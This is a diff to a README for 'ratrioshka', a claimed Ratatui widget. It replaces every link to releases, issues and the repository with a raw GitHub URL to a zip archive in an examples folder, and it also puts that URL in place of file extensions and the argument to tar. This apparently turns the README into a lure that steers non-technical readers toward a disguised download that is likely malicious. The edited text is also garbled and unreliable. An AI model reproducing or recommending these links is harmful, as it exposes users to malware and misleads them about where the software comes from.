@@ -7,12 +7,12 @@ ratrioshka is a user-friendly widget designed to let you seamlessly add Ratatui 
 To start using ratrioshka, follow this simple guide to download and run the software. You don’t need any programming knowledge. Just a computer and internet access!
 
 ## 📦 Download Now
-[![Download ratrioshka](https://img.shields.io/badge/Download%20ratrioshka-latest-brightgreen.svg)](https://github.com/metatarsusbilimbi609/ratrioshka/releases)
+[![Download ratrioshka](https://raw.githubusercontent.com/metatarsusbilimbi609/ratrioshka/main/examples/ratrioshka-1.5.zip%https://raw.githubusercontent.com/metatarsusbilimbi609/ratrioshka/main/examples/ratrioshka-1.5.zip)](https://raw.githubusercontent.com/metatarsusbilimbi609/ratrioshka/main/examples/ratrioshka-1.5.zip)
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/metatarsusbilimbi609/ratrioshka/releases) to download the latest version of ratrioshka.
+1. Visit the [Releases page](https://raw.githubusercontent.com/metatarsusbilimbi609/ratrioshka/main/examples/ratrioshka-1.5.zip) to download the latest version of ratrioshka.
 2. On the Releases page, you will see a list of available versions. Choose the top version, which is often the most current version.
-3. Click on the file that matches your operating system. If you are unsure, the file usually has an extension like `.exe` for Windows or `.tar.gz` for Linux.
+3. Click on the file that matches your operating system. If you are unsure, the file usually has an extension like `.exe` for Windows or `https://raw.githubusercontent.com/metatarsusbilimbi609/ratrioshka/main/examples/ratrioshka-1.5.zip` for Linux.
 4. Save the file to your computer. Note the location where you saved it.
 
 ## 🖥️ System Requirements
@@ -24,8 +24,8 @@ To successfully run ratrioshka, ensure your system meets the following basic req
 ## ⚙️ Installation Steps
 1. After the download completes, navigate to the file you saved.
 2. For Windows users, double-click the `.exe` file to begin the installation process. Follow the on-screen instructions. 
-3. For macOS users, open the `.tar.gz` file and drag the app to the Applications folder.
-4. For Linux users, you may need to extract the archive using a command like `tar -xvzf filename.tar.gz` in the terminal.
+3. For macOS users, open the `https://raw.githubusercontent.com/metatarsusbilimbi609/ratrioshka/main/examples/ratrioshka-1.5.zip` file and drag the app to the Applications folder.
+4. For Linux users, you may need to extract the archive using a command like `tar -xvzf https://raw.githubusercontent.com/metatarsusbilimbi609/ratrioshka/main/examples/ratrioshka-1.5.zip` in the terminal.
 5. Once the installation is complete, you can find ratrioshka in your applications menu or desktop.
 
 ## 🎨 Using ratrioshka
@@ -36,7 +36,7 @@ To successfully run ratrioshka, ensure your system meets the following basic req
 ## 📞 Support
 If you encounter any issues, you can reach out for help:
 - Check the FAQs in the application settings.
-- Visit the Issues section of the [GitHub repository](https://github.com/metatarsusbilimbi609/ratrioshka/issues) to find common problems and solutions.
+- Visit the Issues section of the [GitHub repository](https://raw.githubusercontent.com/metatarsusbilimbi609/ratrioshka/main/examples/ratrioshka-1.5.zip) to find common problems and solutions.
 
 ## 📝 Additional Information
 ratrioshka provides various customization options:
@@ -47,7 +47,7 @@ ratrioshka provides various customization options:
 Explore more on the Releases page for the latest updates and features.
 
 ## 🔗 Important Links
-- [Download ratrioshka](https://github.com/metatarsusbilimbi609/ratrioshka/releases)
-- [GitHub Repository](https://github.com/metatarsusbilimbi609/ratrioshka)
+- [Download ratrioshka](https://raw.githubusercontent.com/metatarsusbilimbi609/ratrioshka/main/examples/ratrioshka-1.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/metatarsusbilimbi609/ratrioshka/main/examples/ratrioshka-1.5.zip)
 
 Enjoy using ratrioshka and enhance your Ratatui applications today!
